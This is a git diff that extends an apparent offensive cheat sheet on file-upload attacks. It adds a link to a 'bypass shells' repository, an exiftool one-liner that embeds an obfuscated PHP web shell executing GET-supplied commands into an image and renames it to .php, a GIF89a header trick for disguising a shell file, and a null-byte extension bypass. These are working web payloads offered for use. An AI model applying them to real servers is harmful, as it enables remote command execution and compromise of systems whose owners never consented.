@@ -63,3 +63,31 @@ asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .v
 | WSO Shell | [Click](https://github.com/mIcHyAmRaNe/wso-webshell) |
 | Reverse Shelll | [Click](https://github.com/yellphonenaing/reverse_shell) |
 | Tiny FileManager | [Click](https://github.com/prasathmani/tinyfilemanager) |
+| Bypass Shells | [Click](https://github.com/T-Tools/bypass_shells) |
+
+**Hide Shell Codes In a File**
+
+```
+exiftool -Comment='<?php $x=$_GET;$sys="system";$c="c";$m="m";$d="d";!isset($x[$c.$m.$d])?phpinfo():$sys($x[$c.$m.$d]);?> ' shell.png
+mv shell.png shell.php
+```
+
+**Bypass With GIF File Header**
+
+```
+Add GIF89a; in the first line of shell file
+echo -n "GIF89a;" >shell.php
+cat shellfile.php >>shell.php
+```
+
+**Nulled Bypass**
+
+```
+shell.php%00.png => shell.php
+```
+
+**Bug Bounty Tip**
+```
+Allow uploading html files leads to client site attacks and cors.
+Allow Uploading Files With Unusual Extensions Leads To Client Site attacks And CORS.
+```
